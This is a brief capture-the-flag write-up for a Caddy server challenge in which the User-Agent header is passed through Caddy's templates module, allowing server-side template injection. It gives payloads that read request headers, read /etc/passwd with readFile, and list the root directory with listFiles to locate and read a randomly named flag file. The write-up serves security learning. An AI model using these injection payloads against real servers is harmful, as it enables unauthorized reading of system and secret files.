there is template injection in user-agent
```
ua.caddy.chal-kalmarc.tf {
tls internal
templates
import html_reply `User-Agent: {{.Req.Header.Get  "User-Agent"}}`
}
```
this reads the accept header: {{.Req.Header.Get "Accept"}}
`{{readFile "/etc/passwd"}}` this reads the /etc/passwd.
As the flag is a random file name, we can't read the file like this.
We can list the files in the root directory using {{listFiles "/"}}
From that we get the name of the flag file and then we can read the file.
refer: https://caddyserver.com/docs/modules/http.handlers.templates
